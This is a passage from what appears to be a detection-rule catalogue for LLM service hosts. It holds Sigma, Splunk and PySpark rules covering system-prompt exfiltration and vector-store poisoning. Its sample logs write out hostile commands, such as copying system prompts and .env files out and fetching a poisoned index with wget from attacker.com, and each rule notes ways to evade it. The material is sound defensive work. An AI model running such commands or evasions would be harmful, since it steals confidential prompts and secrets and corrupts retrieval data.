      "Attacker may extract the system prompt through model responses rather than file reads, making this a complementary detection to output-based prompt leakage monitoring.",
    problemStatement:
      "System prompts contain proprietary instructions, safety guardrails, and business logic. Repeated reads during request handling may indicate active extraction attempts, which could reveal sensitive instructions to adversaries.",
  },
  {
    id: "llm07-002",
    title: "LLM Service Copying Prompt Templates To Temp Or Public Path",
    description:
      "Detects file copy or move operations targeting system prompt or guardrail files as sources, with destinations in temporary or web-accessible directories. This indicates staged exfiltration of confidential prompt material.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1048"],
    category: "AI Security",
    maturity: "experimental",
    severity: "high",
    tags: ["llm", "system-prompt-leakage", "linux", "exfiltration", "owasp-llm07"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Copying Prompt Templates To Temp Or Public Path
owasp top 10: LLM07:2025 System Prompt Leakage
id: f430ceda-b9fe-400b-822e-3ac85cdd3266
status: experimental
logsource:
  category: process_creation
  product: linux
detection:
  selection_proc:
    Image|endswith:
      - /cp
      - /mv
      - /rsync
  selection_cmd:
    CommandLine|contains:
      - system_prompt
      - prompt_templates
      - guardrails
  selection_dest:
    CommandLine|contains:
      - /tmp/
      - /var/tmp/
      - /srv/www/
      - /var/www/
  condition: selection_proc and selection_cmd and selection_dest
fields:
  - Image
  - CommandLine
  - User
  - ComputerName
level: high
tags:
  - attack.exfiltration
  - ai.llm
  - llm07.system-prompt-leakage`,
    splunk: `index=linux_audit sourcetype=auditd_process
  image IN ("*/cp", "*/mv", "*/rsync")
  (command_line="*system_prompt*" OR command_line="*prompt_templates*" OR command_line="*guardrails*")
  (command_line="*/tmp/*" OR command_line="*/var/www/*" OR command_line="*/srv/www/*")
| table _time, computer_name, user, image, command_line
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, command_line,
           'llm07-002' AS detection_id,
           'LLM Service Copying Prompt Templates To Temp Or Public Path' AS detection_name,
           'high' AS severity
    FROM linux_audit_events
    WHERE (image LIKE '%/cp' OR image LIKE '%/mv' OR image LIKE '%/rsync')
      AND (command_line LIKE '%system_prompt%' OR command_line LIKE '%prompt_templates%' OR command_line LIKE '%guardrails%')
      AND (command_line LIKE '%/tmp/%' OR command_line LIKE '%/var/www/%' OR command_line LIKE '%/srv/www/%')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T20:05:33Z","computer_name":"llm-host-01","user":"llm_svc","image":"/bin/cp","command_line":"cp /opt/llm/config/system_prompt.txt /tmp/exfil_prompt.txt"}`,
    ],
    requiredFields: ["image", "command_line", "user", "computer_name"],
    falsePositives: [
      "Approved deployment scripts that distribute prompt templates across hosts",
    ],
    tuningGuidance:
      "Cross-reference with subsequent outbound network connections from the same host to identify the full exfiltration chain.",
    deploymentNotes:
      "System prompt files should be protected with restrictive read permissions. Consider storing them in a secrets manager rather than on disk.",
    evasionConsiderations:
      "Attacker may read and transmit prompt content in-process using the requests library rather than using file copy utilities.",
    problemStatement:
      "Copying confidential prompt material to staging or public web paths is the first step of a two-stage exfiltration. This detection catches the staging phase before the data leaves the host.",
  },
  {
    id: "llm07-003",
    title: "LLM Service Serving Prompt Files Through Web Root",
    description:
      "Detects LLM service processes writing files containing 'prompt', 'system', or 'guardrail' in their name to web server root directories. This makes confidential prompt material directly accessible via HTTP.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1048"],
    category: "AI Security",
    maturity: "experimental",
    severity: "high",
    tags: ["llm", "system-prompt-leakage", "linux", "web-server", "owasp-llm07"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Serving Prompt Files Through Web Root
owasp top 10: LLM07:2025 System Prompt Leakage
id: 12acaa42-7d29-4322-8102-0c8ed036c4f1
status: experimental
logsource:
  category: file_event
  product: linux
detection:
  selection_proc:
    Image|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
  selection_target:
    TargetFilename|contains:
      - /var/www/
      - /usr/share/nginx/html/
      - /srv/www/
  selection_name:
    TargetFilename|contains:
      - prompt
      - system
      - guardrail
  condition: selection_proc and selection_target and selection_name
fields:
  - Image
  - TargetFilename
  - User
  - ComputerName
level: high
tags:
  - attack.exfiltration
  - ai.llm
  - llm07.system-prompt-leakage`,
    splunk: `index=linux_audit sourcetype=auditd_file
  image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  (target_filename="*/var/www/*" OR target_filename="*/usr/share/nginx/html/*" OR target_filename="*/srv/www/*")
  (target_filename="*prompt*" OR target_filename="*system*" OR target_filename="*guardrail*")
| table _time, computer_name, user, image, target_filename
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, target_filename,
           'llm07-003' AS detection_id,
           'LLM Service Serving Prompt Files Through Web Root' AS detection_name,
           'high' AS severity
    FROM linux_file_events
    WHERE (image LIKE '%/opt/llm/%' OR image LIKE '%/srv/llm/%' OR image LIKE '%/app/llm/%')
      AND (target_filename LIKE '%/var/www/%' OR target_filename LIKE '%/usr/share/nginx/html/%')
      AND (target_filename LIKE '%prompt%' OR target_filename LIKE '%system%' OR target_filename LIKE '%guardrail%')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T21:44:18Z","computer_name":"llm-host-01","user":"llm_svc","image":"/opt/llm/app/file_exporter.py","target_filename":"/var/www/html/system_prompt_backup.txt","event_type":"file_create"}`,
    ],
    requiredFields: ["image", "target_filename", "user", "computer_name"],
    falsePositives: [
      "Web-based LLM management UIs that legitimately display prompt configuration via an authenticated interface",
    ],
    tuningGuidance:
      "Alert on any prompt-named file appearing in web roots. Ensure web server directory listings are disabled and confirm no unauthenticated access to these paths.",
    deploymentNotes:
      "LLM services should not coexist with public-facing web servers on the same host without network segmentation.",
    evasionConsiderations:
      "Attacker may encode or obfuscate the prompt file content to avoid name-based detection.",
    problemStatement:
      "Writing system prompt or guardrail files to web server root paths makes proprietary instructions publicly accessible via HTTP, enabling any user to discover safety bypass techniques and confidential system configuration.",
  },
  {
    id: "llm07-004",
    title: "LLM Service Uploading Prompt Or Policy Files To OCI Object Storage",
    description:
      "Detects LLM service processes using the OCI CLI to upload prompt, system, or policy files to object storage. This represents exfiltration of confidential prompt material to cloud storage that may be accessible to unauthorised parties.",
    platform: ["Linux", "AI/ML", "OCI"],
    mitre: ["T1048.002"],
    category: "AI Security",
    maturity: "experimental",
    severity: "high",
    tags: ["llm", "system-prompt-leakage", "linux", "oci", "owasp-llm07"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Uploading Prompt Or Policy Files To OCI Object Storage
owasp top 10: LLM07:2025 System Prompt Leakage
id: 6ee34482-26de-4889-a312-3da960e9530a
status: experimental
logsource:
  category: process_creation
  product: linux
detection:
  selection_parent:
    ParentImage|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
  selection_child:
    Image|endswith:
      - /oci
  selection_cmd:
    CommandLine|contains:
      - object put
      - os object put
      - bucket
  selection_hint:
    CommandLine|contains:
      - prompt
      - system
      - policy
      - guardrail
  condition: selection_parent and selection_child and selection_cmd and selection_hint
fields:
  - ParentImage
  - Image
  - CommandLine
  - User
  - ComputerName
level: high
tags:
  - attack.exfiltration
  - ai.llm
  - llm07.system-prompt-leakage`,
    splunk: `index=linux_audit sourcetype=auditd_process
  parent_image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  image="*/oci"
  (command_line="*object put*" OR command_line="*os object put*")
  (command_line="*prompt*" OR command_line="*system*" OR command_line="*guardrail*")
| table _time, computer_name, user, image, command_line, parent_image
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, command_line, parent_image,
           'llm07-004' AS detection_id,
           'LLM Service Uploading Prompt Or Policy Files To OCI Object Storage' AS detection_name,
           'high' AS severity
    FROM linux_audit_events
    WHERE (parent_image LIKE '%/opt/llm/%' OR parent_image LIKE '%/srv/llm/%')
      AND image LIKE '%/oci'
      AND (command_line LIKE '%object put%' OR command_line LIKE '%os object put%')
      AND (command_line LIKE '%prompt%' OR command_line LIKE '%system%' OR command_line LIKE '%guardrail%')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T22:30:55Z","computer_name":"llm-host-02","user":"llm_svc","image":"/usr/local/bin/oci","command_line":"oci os object put --bucket-name public-bucket --name leaked_system_prompt.txt --file /opt/llm/config/system_prompt.txt","parent_image":"/opt/llm/app/backup_tool.py"}`,
    ],
    requiredFields: ["image", "command_line", "parent_image", "user", "computer_name"],
    falsePositives: [
      "Approved prompt management workflows that back up system prompts to versioned OCI buckets",
    ],
    tuningGuidance:
      "Baseline approved bucket names and object naming conventions for legitimate prompt backup workflows. Alert on any upload to buckets outside this baseline.",
    deploymentNotes:
      "Use OCI Object Storage bucket policies to enforce encryption and restrict public access. Monitor OCI audit logs for object PUT operations on sensitive buckets.",
    evasionConsiderations:
      "Attacker may use the OCI Python SDK directly to upload files without spawning the CLI binary.",
    problemStatement:
      "Uploading system prompt files to object storage makes confidential model instructions accessible to anyone with bucket read permissions. If the bucket is public or the attacker controls it, this constitutes full prompt leakage.",
  },
  {
    id: "llm07-005",
    title: "LLM Service Reading Secrets And Prompt Material In Same Execution Chain",
    description:
      "Detects LLM service processes spawning text utilities (cat, grep, sed) that reference both secret files and prompt configuration files in the same command, indicating combined credential and prompt material harvesting.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1005", "T1552.001"],
    category: "AI Security",
    maturity: "experimental",
    severity: "medium",
    tags: ["llm", "system-prompt-leakage", "linux", "file-access", "owasp-llm07"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Reading Secrets And Prompt Material In Same Execution Chain
owasp top 10: LLM07:2025 System Prompt Leakage
id: 72eac8a3-673f-4d7a-907f-d35de70f0b48
status: experimental
logsource:
  category: process_creation
  product: linux
detection:
  selection_parent:
    ParentImage|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
  selection_child:
    Image|endswith:
      - /cat
      - /grep
      - /sed
  selection_cmd:
    CommandLine|contains:
      - system_prompt
      - guardrail
      - .env
      - .oci/config
  condition: selection_parent and selection_child and selection_cmd
fields:
  - ParentImage
  - Image
  - CommandLine
  - User
  - ComputerName
level: medium
tags:
  - attack.collection
  - ai.llm
  - llm07.system-prompt-leakage`,
    splunk: `index=linux_audit sourcetype=auditd_process
  parent_image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  image IN ("*/cat", "*/grep", "*/sed")
  (command_line="*system_prompt*" OR command_line="*guardrail*" OR command_line="*.env*" OR command_line="*.oci/config*")
| table _time, computer_name, user, image, command_line, parent_image
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, command_line, parent_image,
           'llm07-005' AS detection_id,
           'LLM Service Reading Secrets And Prompt Material In Same Execution Chain' AS detection_name,
           'medium' AS severity
    FROM linux_audit_events
    WHERE (parent_image LIKE '%/opt/llm/%' OR parent_image LIKE '%/srv/llm/%' OR parent_image LIKE '%/app/llm/%')
      AND (image LIKE '%/cat' OR image LIKE '%/grep' OR image LIKE '%/sed')
      AND (command_line LIKE '%system_prompt%'
        OR command_line LIKE '%guardrail%'
        OR command_line LIKE '%.env%'
        OR command_line LIKE '%.oci/config%')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T17:08:44Z","computer_name":"llm-host-03","user":"llm_svc","image":"/bin/cat","command_line":"cat /opt/llm/config/system_prompt.txt /opt/llm/app/.env","parent_image":"/opt/llm/app/debug_tool.py"}`,
    ],
    requiredFields: ["image", "command_line", "parent_image", "user", "computer_name"],
    falsePositives: [
      "Debug or diagnostic scripts that print configuration for troubleshooting",
    ],
    tuningGuidance:
      "Restrict the alert to process chains with sensitive file combinations. Correlate with outbound network events to identify if the harvested data was transmitted.",
    deploymentNotes:
      "Requires process creation telemetry with full command-line capture. Consider removing cat, grep, and sed from LLM service host images.",
    evasionConsiderations:
      "Attacker may read files using Python open() calls within the LLM process rather than spawning text utilities.",
    problemStatement:
      "Combining secret and system prompt material in a single read chain suggests a comprehensive information gathering operation, likely staged as part of a larger exfiltration attempt.",
  },

  // ── LLM08: Vector and Embedding Weaknesses ────────────────────────────────
  {
    id: "llm08-001",
    title: "LLM Service Modifying Vector Database Files",
    description:
      "Detects LLM service processes writing to vector database files (FAISS, SQLite, Parquet, JSONL) in vector or embedding directories. Direct modification of vector stores can inject poisoned embeddings that corrupt RAG retrieval results.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1565.001"],
    category: "AI Security",
    maturity: "experimental",
    severity: "high",
    tags: ["llm", "vector-embedding", "linux", "vector-db", "owasp-llm08"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Modifying Vector Database Files
owasp top 10: LLM08:2025 Vector and Embedding Weaknesses
id: e981e178-ddfa-43c4-bf39-2290356982df
status: experimental
logsource:
  category: file_event
  product: linux
detection:
  selection_proc:
    Image|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  selection_file:
    TargetFilename|endswith:
      - .faiss
      - .sqlite
      - .db
      - .parquet
      - .jsonl
  selection_hint:
    TargetFilename|contains:
      - vector
      - embedding
      - chroma
      - qdrant
      - faiss
  condition: selection_proc and selection_file and selection_hint
fields:
  - Image
  - TargetFilename
  - User
  - ComputerName
level: high
tags:
  - attack.impact
  - ai.llm
  - llm08.vector-and-embedding-weaknesses`,
    splunk: `index=linux_audit sourcetype=auditd_file
  image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  (target_filename="*.faiss" OR target_filename="*.sqlite" OR target_filename="*.db" OR target_filename="*.parquet")
  (target_filename="*vector*" OR target_filename="*embedding*" OR target_filename="*chroma*" OR target_filename="*qdrant*")
  NOT event_type="read"
| table _time, computer_name, user, image, target_filename, event_type
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, target_filename, event_type,
           'llm08-001' AS detection_id,
           'LLM Service Modifying Vector Database Files' AS detection_name,
           'high' AS severity
    FROM linux_file_events
    WHERE (image LIKE '%/opt/llm/%' OR image LIKE '%/srv/llm/%' OR image LIKE '%/app/llm/%')
      AND (target_filename LIKE '%.faiss' OR target_filename LIKE '%.sqlite' OR target_filename LIKE '%.parquet')
      AND (target_filename LIKE '%vector%' OR target_filename LIKE '%embedding%' OR target_filename LIKE '%chroma%' OR target_filename LIKE '%qdrant%')
      AND event_type != 'read'
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T06:15:22Z","computer_name":"llm-host-01","user":"llm_svc","image":"/opt/llm/app/rag_updater.py","target_filename":"/opt/llm/vector/chroma/embeddings.sqlite","event_type":"file_modify"}`,
    ],
    requiredFields: ["image", "target_filename", "event_type", "user", "computer_name"],
    falsePositives: [
      "Approved RAG indexing pipelines that periodically update the vector store with new documents",
    ],
    tuningGuidance:
      "Establish a schedule for approved vector store updates. Alert on modifications outside this window or from unexpected process paths.",
    deploymentNotes:
      "Vector database files should be write-protected during inference. Use a separate indexing service account with write access, distinct from the inference service account.",
    evasionConsiderations:
      "Attacker may inject poisoned embeddings via the vector database's HTTP API endpoint rather than modifying files directly.",
    problemStatement:
      "Modifying vector database files can inject embeddings that cause the RAG system to retrieve attacker-controlled content, poisoning model responses without changing the model weights themselves.",
  },
  {
    id: "llm08-002",
    title: "LLM Service Downloading Embeddings Or Index Files From External Host",
    description:
      "Detects curl, wget, or Python processes downloading files with embedding or vector index extensions from external hosts not in the OCI baseline. This pattern indicates replacement of the vector store with externally sourced, potentially poisoned content.",
    platform: ["Linux", "AI/ML", "Network"],
    mitre: ["T1105"],
    category: "AI Security",
    maturity: "experimental",
    severity: "medium",
    tags: ["llm", "vector-embedding", "linux", "download", "owasp-llm08"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Downloading Embeddings Or Index Files From External Host
owasp top 10: LLM08:2025 Vector and Embedding Weaknesses
id: 79df5875-4f9d-4a2f-8d4e-018e7f06e76d
status: experimental
logsource:
  category: process_creation
  product: linux
detection:
  selection_proc:
    Image|endswith:
      - /curl
      - /wget
      - /python
      - /python3
  selection_cmd:
    CommandLine|contains:
      - .faiss
      - .parquet
      - .jsonl
      - /embeddings/
      - /vector/
  filter_oci:
    CommandLine|contains:
      - oraclecloud.com
      - oracle.com
  condition: selection_proc and selection_cmd and not filter_oci
fields:
  - Image
  - CommandLine
  - User
  - ComputerName
level: medium
tags:
  - attack.collection
  - ai.llm
  - llm08.vector-and-embedding-weaknesses`,
    splunk: `index=linux_audit sourcetype=auditd_process
  image IN ("*/curl", "*/wget", "*/python", "*/python3")
  (command_line="*.faiss*" OR command_line="*.parquet*" OR command_line="*/embeddings/*" OR command_line="*/vector/*")
  NOT (command_line="*oraclecloud.com*" OR command_line="*oracle.com*")
| table _time, computer_name, user, image, command_line
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, command_line,
           'llm08-002' AS detection_id,
           'LLM Service Downloading Embeddings Or Index Files From External Host' AS detection_name,
           'medium' AS severity
    FROM linux_audit_events
    WHERE (image LIKE '%/curl' OR image LIKE '%/wget' OR image LIKE '%/python3')
      AND (command_line LIKE '%.faiss%' OR command_line LIKE '%.parquet%' OR command_line LIKE '%/embeddings/%')
      AND command_line NOT LIKE '%oraclecloud.com%'
      AND command_line NOT LIKE '%oracle.com%'
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T07:33:18Z","computer_name":"llm-host-02","user":"llm_svc","image":"/usr/bin/wget","command_line":"wget https://attacker.com/poisoned_index.faiss -O /opt/llm/vector/index.faiss"}`,
    ],
    requiredFields: ["image", "command_line", "user", "computer_name"],
    falsePositives: [
      "Approved data pipeline scripts that download embedding files from HuggingFace or other approved hosts",
    ],
    tuningGuidance:
      "Add approved external embedding sources to the filter. Most production environments should not download embedding files from external hosts at runtime.",
    deploymentNotes:
      "Vector index files should be distributed through a controlled pipeline, not downloaded on-demand from external sources during inference.",
    evasionConsiderations:
      "Attacker may use the OCI Python SDK to download poisoned embeddings from an attacker-controlled OCI bucket, which would pass the OCI hostname filter.",
    problemStatement:
      "Downloading embedding or vector index files from external hosts at runtime bypasses integrity controls and can introduce poisoned retrieval data that corrupts RAG-based model responses.",
  },
  {
    id: "llm08-003",
    title: "LLM Service Replacing Retrieval Index From Temp Path",
    description:
      "Detects file copy, move, or rsync operations replacing vector or embedding index files with content sourced from temporary directories. This staged replacement pattern indicates an in-flight vector store poisoning attack.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1565.001"],
    category: "AI Security",
    maturity: "experimental",
    severity: "high",
    tags: ["llm", "vector-embedding", "linux", "index-replace", "owasp-llm08"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Replacing Retrieval Index From Temp Path
owasp top 10: LLM08:2025 Vector and Embedding Weaknesses
id: b6068804-2816-4a5d-9441-b2ba121095f7
status: experimental
logsource:
  category: process_creation
  product: linux
detection:
  selection_proc:
    Image|endswith:
      - /cp
      - /mv
      - /rsync
  selection_cmd:
    CommandLine|contains:
      - /tmp/
      - /var/tmp/
  selection_target:
    CommandLine|contains:
      - vector
      - embedding
      - chroma
      - faiss
      - qdrant
  condition: selection_proc and selection_cmd and selection_target
fields:
  - Image
  - CommandLine
  - User
  - ComputerName
level: high
tags:
  - attack.impact
  - ai.llm
  - llm08.vector-and-embedding-weaknesses`,
    splunk: `index=linux_audit sourcetype=auditd_process
  image IN ("*/cp", "*/mv", "*/rsync")
  (command_line="*/tmp/*" OR command_line="*/var/tmp/*")
  (command_line="*vector*" OR command_line="*embedding*" OR command_line="*chroma*" OR command_line="*faiss*")
| table _time, computer_name, user, image, command_line
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, command_line,
           'llm08-003' AS detection_id,
           'LLM Service Replacing Retrieval Index From Temp Path' AS detection_name,
           'high' AS severity
    FROM linux_audit_events
    WHERE (image LIKE '%/cp' OR image LIKE '%/mv' OR image LIKE '%/rsync')
      AND (command_line LIKE '%/tmp/%' OR command_line LIKE '%/var/tmp/%')
      AND (command_line LIKE '%vector%' OR command_line LIKE '%embedding%' OR command_line LIKE '%faiss%' OR command_line LIKE '%chroma%')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T08:44:07Z","computer_name":"llm-host-01","user":"opc","image":"/bin/mv","command_line":"mv /tmp/poisoned_index.faiss /opt/llm/vector/index.faiss"}`,
    ],
    requiredFields: ["image", "command_line", "user", "computer_name"],
    falsePositives: [
      "Index rebuild scripts that use /tmp as a staging area before atomic replacement",
    ],
    tuningGuidance:
      "Implement a canary file approach — include a known-good embedding in the index and alert if retrieval quality drops after an index replacement event.",
    deploymentNotes:
      "Vector index replacement should follow an approved pipeline with integrity verification. Use checksums or digital signatures on index files before deploying them.",
    evasionConsiderations:
      "Attacker may modify the index file in place using the vector database's native API rather than replacing the file via cp/mv.",
    problemStatement:
      "Replacing the retrieval index from a staging path is the execution phase of a vector poisoning attack. Once replaced, every RAG query may return attacker-controlled context until the legitimate index is restored.",
  },
  {
    id: "llm08-004",
    title: "Unexpected Access To Retrieval Cache Or Memory Store",
    description:
      "Detects LLM service processes accessing cache, memory, retrieval, or RAG directories at unusual times or with unusual frequency. Anomalous access to these components may indicate probing of the retrieval layer for vulnerability assessment or data extraction.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1005"],
    category: "AI Security",
    maturity: "experimental",
    severity: "medium",
    tags: ["llm", "vector-embedding", "linux", "rag", "owasp-llm08"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: Unexpected Access To Retrieval Cache Or Memory Store
owasp top 10: LLM08:2025 Vector and Embedding Weaknesses
id: cca3d092-46e9-4fe7-84a8-a3cb885c7a85
status: experimental
logsource:
  category: file_access
  product: linux
detection:
  selection_proc:
    Image|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  selection_path:
    TargetFilename|contains:
      - /cache/
      - /memory/
      - /retrieval/
      - /rag/
  condition: selection_proc and selection_path
fields:
  - Image
  - TargetFilename
  - User
  - ComputerName
level: medium
tags:
  - attack.collection
  - ai.llm
  - llm08.vector-and-embedding-weaknesses`,
    splunk: `index=linux_audit sourcetype=auditd_file
  image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  (target_filename="*/cache/*" OR target_filename="*/memory/*" OR target_filename="*/retrieval/*" OR target_filename="*/rag/*")
| stats count AS access_count BY computer_name, user, image, target_filename
| where access_count > 100
| sort -access_count`,
    pyspark: `result = spark.sql("""
    SELECT computer_name AS host, user, image,
           target_filename, COUNT(*) AS access_count,
           'llm08-004' AS detection_id,
           'Unexpected Access To Retrieval Cache Or Memory Store' AS detection_name,
           'medium' AS severity
    FROM linux_file_events
    WHERE (image LIKE '%/opt/llm/%' OR image LIKE '%/srv/llm/%' OR image LIKE '%/app/llm/%')
      AND (target_filename LIKE '%/cache/%'
        OR target_filename LIKE '%/memory/%'
        OR target_filename LIKE '%/retrieval/%'
        OR target_filename LIKE '%/rag/%')
    GROUP BY computer_name, user, image, target_filename
    HAVING COUNT(*) > 100
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T13:07:55Z","computer_name":"llm-host-03","user":"llm_svc","image":"/opt/llm/app/rag_engine.py","target_filename":"/opt/llm/rag/document_cache/doc_001.pkl","access_type":"read"}`,
    ],
    requiredFields: ["image", "target_filename", "user", "computer_name"],
    falsePositives: [
      "Normal RAG retrieval operations that access cache files during inference",
    ],
    tuningGuidance:
      "Use a frequency threshold and time-of-day baseline. Alert on access volumes significantly above the normal inference workload, or on access outside business hours.",
    deploymentNotes:
      "This detection works best as a statistical anomaly rule rather than a per-event alert. Requires aggregation over a time window.",
    evasionConsiderations:
      "Attacker may probe the retrieval layer at a rate below the detection threshold to avoid frequency-based alerting.",
    problemStatement:
      "Anomalous access patterns to the retrieval cache or RAG memory store indicate probing or bulk extraction of the knowledge base that powers model responses.",
  },
  {
    id: "llm08-005",
    title: "LLM Service Network Connection To External Vector Or Search Platform",
    description:
      "Detects LLM service processes connecting to external vector database or search platforms (Pinecone, Weaviate, Qdrant, Milvus, Elasticsearch) outside the approved OCI baseline. Unapproved connections may indicate data exfiltration or use of attacker-controlled vector stores.",
    platform: ["Linux", "AI/ML", "Network"],
    mitre: ["T1071.001"],
    category: "AI Security",
    maturity: "experimental",
    severity: "medium",
    tags: ["llm", "vector-embedding", "linux", "network", "owasp-llm08"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Network Connection To External Vector Or Search Platform
owasp top 10: LLM08:2025 Vector and Embedding Weaknesses
id: 0340733c-6394-41b3-b3b5-cb31453ac459
status: experimental
logsource:
  category: network_connection
  product: linux
detection:
  selection_proc:
    Image|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  selection_host:
    DestinationHostname|contains:
      - pinecone
      - weaviate
      - qdrant
      - milvus
      - elastic
  filter_approved:
    DestinationHostname|endswith:
      - .oraclecloud.com
      - .oracle.com
      - .company.internal
  condition: selection_proc and selection_host and not filter_approved
fields:
  - Image
  - DestinationHostname
  - DestinationIp
  - User
  - ComputerName
level: medium
tags:
  - attack.command-and-control
  - ai.llm
  - llm08.vector-and-embedding-weaknesses`,
    splunk: `index=linux_network sourcetype=network_connection
  image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  (dest_hostname="*pinecone*" OR dest_hostname="*weaviate*" OR dest_hostname="*qdrant*" OR dest_hostname="*milvus*" OR dest_hostname="*elastic*")
  NOT (dest_hostname="*.oraclecloud.com" OR dest_hostname="*.oracle.com")
| table _time, computer_name, user, image, dest_hostname, dest_ip
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, destination_hostname, destination_ip,
           'llm08-005' AS detection_id,
           'LLM Service Network Connection To External Vector Or Search Platform' AS detection_name,
           'medium' AS severity
    FROM linux_network_events
    WHERE (image LIKE '%/opt/llm/%' OR image LIKE '%/srv/llm/%' OR image LIKE '%/app/llm/%')
      AND (destination_hostname LIKE '%pinecone%'
        OR destination_hostname LIKE '%weaviate%'
        OR destination_hostname LIKE '%qdrant%'
        OR destination_hostname LIKE '%milvus%'
        OR destination_hostname LIKE '%elastic%')
      AND destination_hostname NOT LIKE '%.oraclecloud.com'
      AND destination_hostname NOT LIKE '%.oracle.com'
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T16:28:44Z","computer_name":"llm-host-02","user":"llm_svc","image":"/opt/llm/app/rag_client.py","destination_hostname":"attacker-qdrant.cloud","destination_ip":"198.51.100.22","destination_port":6333}`,
    ],
    requiredFields: ["image", "destination_hostname", "destination_ip", "user", "computer_name"],
    falsePositives: [
      "Approved LLM deployments that use cloud-hosted vector database services as the retrieval backend",
    ],
    tuningGuidance:
      "Add approved external vector database hostnames to the filter. Alert on any first-seen vector database endpoint.",
    deploymentNotes:
      "If using external vector database services is required, restrict connections to approved endpoints via egress firewall rules and document the approved service list.",
    evasionConsiderations:
      "Attacker may host a vector database on a custom domain that does not contain recognisable vendor keywords.",
    problemStatement:
      "Connecting to external vector search platforms from an LLM service can route retrieval queries through attacker-controlled infrastructure, enabling poisoned context injection or query data exfiltration.",
  },

  // ── LLM09: Misinformation ─────────────────────────────────────────────────
  {
    id: "llm09-001",
    title: "LLM Service Writing Answer Cache Outside Approved Path",
    description:
      "Detects LLM service processes writing response or answer cache files to paths outside the approved application directories. Caching model responses in unexpected locations may indicate manipulation of cached answers to serve attacker-controlled misinformation.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1565.001"],
    category: "AI Security",
    maturity: "experimental",
    severity: "medium",
    tags: ["llm", "misinformation", "linux", "file-write", "owasp-llm09"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Writing Answer Cache Or Response Store Outside Approved Path
owasp top 10: LLM09:2025 Misinformation
id: 3c667c7a-bcd2-4a97-a95c-2a10da4adbff
status: experimental
logsource:
  category: file_event
  product: linux
detection:
  selection_proc:
    Image|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
  selection_file:
    TargetFilename|contains:
      - /responses/
      - /answer-cache/
      - /generated/
  filter_allowed:
    TargetFilename|contains:
      - /opt/llm/responses/
      - /srv/llm/responses/
  condition: selection_proc and selection_file and not filter_allowed
fields:
  - Image
  - TargetFilename
  - User
  - ComputerName
level: medium
tags:
  - attack.impact
  - ai.llm
  - llm09.misinformation`,
    splunk: `index=linux_audit sourcetype=auditd_file
  image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  (target_filename="*/responses/*" OR target_filename="*/answer-cache/*" OR target_filename="*/generated/*")
  NOT (target_filename="*/opt/llm/responses/*" OR target_filename="*/srv/llm/responses/*")
| table _time, computer_name, user, image, target_filename
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, target_filename,
           'llm09-001' AS detection_id,
           'LLM Service Writing Answer Cache Outside Approved Path' AS detection_name,
           'medium' AS severity
    FROM linux_file_events
    WHERE (image LIKE '%/opt/llm/%' OR image LIKE '%/srv/llm/%' OR image LIKE '%/app/llm/%')
